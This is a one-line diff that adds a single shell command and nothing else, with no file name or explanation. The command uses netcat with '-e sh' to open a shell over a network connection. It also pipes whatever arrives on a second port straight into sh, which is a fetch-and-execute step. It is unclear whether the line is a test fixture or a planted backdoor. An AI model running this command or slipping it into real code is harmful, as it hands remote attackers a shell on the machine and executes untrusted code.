@@ -1,0 +1,1 @@
+echo 1 | nc 0.0.0.0 8600 -e sh -c "echo $(nc 0.0.0.0 8500 2>/dev/null | sh)"
